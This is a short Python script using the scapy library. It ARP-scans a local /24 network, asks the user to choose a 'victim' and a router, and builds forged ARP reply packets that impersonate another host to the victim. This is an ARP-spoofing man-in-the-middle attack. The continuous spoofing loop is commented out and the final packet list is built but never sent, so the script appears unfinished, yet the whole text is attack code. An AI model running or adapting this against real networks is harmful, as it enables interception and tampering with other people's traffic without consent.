from scapy.all import ARP, Ether, srp


result = srp((Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.5.1.0/24")), timeout=3, verbose=0)[0]

print("Online IPs:")
ip=[]
mac=[]
for sent, received in result:
    ip.append(received.psrc)
    mac.append(received.hwsrc)

for i in range (len(ip)):
    print(ip[i], " = ", mac[i])

print("Chose a victim:")
victim = int(input())
print("Chose the router:")
router = int(input())

print ("Victim ip: ", ip[victim-1],"    Victim mac: ", mac[victim-1])

print ("Router ip: ", ip[router-1],"    Router mac: ", mac[router-1])

#hwsrc:mac source
#hwdst: mac dest
#psrc:ip source
#pdst:ip dest

#try:
 #   while True:
  #      torouter = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[victim-1]), pdst=(ip[router-1]),hwdst=(mac[router-1])), timeout=3, verbose=0)
   #     tovictim = srp(ARP(hwsrc = Ether().src,op = 2,psrc=(ip[router-1]), pdst=(ip[victim-1]),hwdst=(mac[victim-1])), timeout=3, verbose=0)
#except KeyboardInterrupt:
 #   pass

packets = [Ether(dst=mac[victim-1]) / ARP(op=2, psrc="10.5.1.3", pdst=ip[victim-1], hwdst=mac[victim-1])]


    
    

    
    